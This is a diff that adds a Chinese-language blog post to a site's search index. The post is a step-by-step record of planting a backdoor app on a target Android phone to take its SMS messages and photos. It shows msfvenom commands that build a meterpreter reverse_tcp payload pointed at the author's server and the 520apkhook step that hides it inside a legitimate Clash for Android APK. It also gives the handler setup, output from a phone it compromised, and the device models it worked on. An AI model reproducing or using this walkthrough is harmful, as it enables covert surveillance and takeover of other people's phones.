@@ -18749,4 +18749,157 @@ java-1.6.0-openjdk-1.6.0.0-1.7.b09.el5</p>
         <tag>SecurityTools</tag>
       </tags>
   </entry>
+  <entry>
+    <title>DevRecord-AndroidBackdoorApp</title>
+    <url>/2023/3464.html</url>
+    <content><![CDATA[<h1>Pre:</h1>
+<p>需求:给一个目标安卓手机植入后门app,以获取其短信、相册等信息。</p>
+<h1>整体思路:</h1>
+<ol>
+<li class="lvl-3">
+<p>服务器安装并运行msf框架,开启监听</p>
+</li>
+<li class="lvl-3">
+<p>使用<a href="https://github.com/ba0gu0/520apkhook?tab=readme-ov-file">520apkhook</a>注入一个干净的apk,生成新的apk</p>
+</li>
+<li class="lvl-3">
+<p>目标手机安装修改后的apk,打开app后,肉鸡能够上线</p>
+</li>
+</ol>
+<h1>centos7运行msf框架:</h1>
+<h2 id="安装msf">安装msf:</h2>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://blog.csdn.net/weixin_46944519/article/details/126773677">Centos 7.6安装MetaSploit</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">metasploit官方文档</a></p>
+</li>
+</ul>
+<p>msf快速安装命令:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span class="built_in">chmod</span> 755 msfinstall &amp;&amp; ./msfinstall</span><br></pre></td></tr></table></figure>
+<p>快速安装脚本报错,需要修改yum的一些配置:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vim /usr/libexec/urlgrabber-ext-down</span><br><span class="line">vim /usr/bin/yum</span><br><span class="line"></span><br><span class="line">python -&gt; python2</span><br></pre></td></tr></table></figure>
+<p>报错解决参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://stackoverflow.com/questions/11213520/yum-crashed-with-keyboard-interrupt-error">Yum crashed with Keyboard Interrupt error</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://unix.stackexchange.com/questions/524552/upgraded-python-and-now-i-cant-run-yum-upgrade">Upgraded Python, and now I can’t run “yum upgrade”</a></p>
+</li>
+</ul>
+<h2 id="安装Postgresql">安装Postgresql:</h2>
+<p>一开始直接用yum安装了PostgreSQL 9.2几的版本,发现和安装的msf不兼容。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf6 &gt; db_status</span><br><span class="line">[-] Error <span class="keyword">while</span> running <span class="built_in">command</span> db_status: Your version of PostgreSQL (90224) is too old. Active Record supports PostgreSQL &gt;= 9.3.</span><br></pre></td></tr></table></figure>
+<p>后来选择重新安装psql11版本的。参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://www.cnblogs.com/lfxx/p/17616078.html">Centos7 安装 postgresql-11</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://www.cnblogs.com/kerrycode/p/14324465.html">PostgreSQL忘记postgres账号的密码怎么办？</a></p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum安装</span></span><br><span class="line">yum install postgresql11 postgresql11-devel postgresql11-libs postgresql11-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改环境变量</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/pgsql-11/bin:<span class="variable">$PATH</span></span><br><span class="line">/usr/pgsql-11/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统启动配置</span></span><br><span class="line">systemctl start postgresql-11</span><br><span class="line">systemctl restart postgresql-11</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忘记密码,可以在配置文件里设置为trust后进入psql</span></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim /var/lib/pgsql/11/data/pg_hba.conf</span><br></pre></td></tr></table></figure>
+<p>配置msf连接psql:</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> /opt/metasploit-framework/embedded/framework/config/database.yml.example /opt/metasploit-framework/embedded/framework/config/database.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给msf创建psql用户</span></span><br><span class="line">ALTER USER postgres WITH PASSWORD <span class="string">&#x27;msf&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://www.codenong.com/6790088/">关于linux：Postgresql -bash：psql：找不到命令</a></p>
+</li>
+</ul>
+<h1>安装jdk11:</h1>
+<p>参考文章:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://blog.csdn.net/qqq1994_0810/article/details/128196328">centos7两种方式安装jdk11</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://blog.csdn.net/lzllzllzlzz/article/details/118998187">centos7更换jdk版本不生效解决办法</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://www.cnblogs.com/ww1984/p/15934103.html">jdk8与jdk11在centos7下的安装</a></p>
+</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改环境变量,替换原来的jdk1.8</span></span><br><span class="line">vim /etc/profile.d/jdk11.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向文件中添加如下内容</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/lib/jvm/java-11-openjdk-11.0.21.0.9-1.el7_9.x86_64</span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>
+<h1>注入apk:</h1>
+<p>使用该github项目: <a href="https://github.com/ba0gu0/520apkhook">https://github.com/ba0gu0/520apkhook</a></p>
+<p>下载一个干净的<a href="https://dl.jichangzhu.com/clients/clash_for_android/releases/latest/">apk</a>:</p>
+<ol>
+<li class="lvl-3">
+<p>下载Releases中打包好的jar包</p>
+</li>
+</ol>
+<p><a href="https://github.com/ba0gu0/520apkhook/releases">https://github.com/ba0gu0/520apkhook/releases</a></p>
+<ol start="2">
+<li class="lvl-3">
+<p>msfmsfvenom:</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=服务器ip lport=3306 -o ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自己的</span></span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp lhost=74.48.x.x lport=10001 -o /jhack/cfa-2.5.12-premium-universal-release.apk </span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li class="lvl-3">
+<p>启动msfconsole</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动 msfconsole</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload android/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line"><span class="built_in">set</span> lport 10001</span><br><span class="line"><span class="built_in">set</span> exitonsession <span class="literal">false</span></span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150435.png" alt="20231223150435" /></p>
+<ol start="4">
+<li class="lvl-3">
+<p>520ApkHook:</p>
+</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 官方教程:</span></span><br><span class="line">java -jar a520ApkHook-1.0-jar-with-dependencies.jar  ~/Downloads/京东.apk ~/Downloads/msf.apk</span><br><span class="line"></span><br><span class="line"><span class="comment"># centos7:</span></span><br><span class="line">java -jar a520ApkHook-1.1-jar-with-dependencies.jar /jhack/ClashForAndroid\ 2.5.12.apk /jhack/NewClashForAndroid.apk</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150534.png" alt="20231223150534" /><br />
+<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223150819.png" alt="20231223150819" /></p>
+<ol>
+<li class="lvl-3">
+<p>520ApkHook工具会生成出一个修改好的pk</p>
+</li>
+</ol>
+<h1>目标安卓手机运行后门app:</h1>
+<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20231223160745.png" alt="20231223160745" /><br />
+目标安卓手机安装apk,并运行app.肉鸡上线成功。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 获取目标手机系统信息</span></span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : localhost</span><br><span class="line">OS              : Android 10 - Linux 4.14.116 (aarch64)</span><br><span class="line">Architecture    : aarch64</span><br><span class="line">System Language : zh_CN_<span class="comment">#Hans</span></span><br><span class="line">Meterpreter     : dalvik/android</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取应用列表</span></span><br><span class="line">meterpreter &gt; app_list</span><br><span class="line">Application List</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">Name                                     Package                                   Running  IsSystem</span><br><span class="line">----                                     -------                                   -------  --------</span><br><span class="line">ARCore                                   com.google.ar.core                        <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AREngineServer                           com.huawei.arengine.service               <span class="literal">false</span>    <span class="literal">true</span></span><br><span class="line">AirLink                                  com.huawei.airlink                        <span class="literal">false</span>    <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+<p>更多的msf利用命令可参考:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://iyouport.substack.com/p/-metasploitandroid17">尝试 Metasploit入侵Android移动设备：黑客主义行动力（17）</a></p>
+</li>
+<li class="lvl-2">
+<p><a href="https://blog.csdn.net/m0_74914256/article/details/130502678">Kali Linux利用MSF入侵安卓手机(零基础版超详细)</a></p>
+</li>
+</ul>
+<p>测试结果:</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>华为p30 harmonyos 3.0  成功</p>
+</li>
+<li class="lvl-2">
+<p>华为p40 harmonyos 4.0  系统版本号5.10.43  失败</p>
+</li>
+</ul>
+<h1>Refs:</h1>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p><a href="https://feng4.github.io/2019/08/19/centos%E5%AE%89%E8%A3%85msf/">centos安装msf</a></p>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>DevRecord</category>
+      </categories>
+      <tags>
+        <tag>DevRecord</tag>
+      </tags>
+  </entry>
 </search>
